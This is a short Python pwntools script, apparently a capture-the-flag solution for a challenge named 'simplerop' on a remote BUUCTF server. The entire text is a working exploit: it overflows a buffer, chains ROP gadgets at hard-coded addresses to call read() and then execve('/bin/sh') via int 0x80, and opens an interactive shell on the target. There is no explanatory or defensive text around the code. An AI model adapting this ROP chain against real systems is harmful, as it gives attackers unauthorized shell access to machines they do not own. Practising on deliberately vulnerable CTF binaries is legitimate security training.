from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug')
# io = process('simplerop')
io = remote('node4.buuoj.cn', 27701)
elf = ELF('simplerop')
read = elf.symbols['read']
pop_eax_ret = 0x080bae06 
pop_edx_ecx_ebx_ret = 0x0806e850
int80 = 0x080493e1 
buf = 0x080EC2C0

payload = cyclic(0x20)
# read(0, buf, 8) 
payload += p32(read) + p32(pop_edx_ecx_ebx_ret)
payload += p32(0) + p32(buf) + p32(8)
# execve('/bin/sh', 0, 0)
payload += p32(pop_eax_ret) + p32(11)
payload += p32(pop_edx_ecx_ebx_ret) + p32(0) + p32(0) + p32(buf)
payload += p32(int80)
io.sendline(payload)
io.send(b'/bin/sh\x00')
io.interactive()

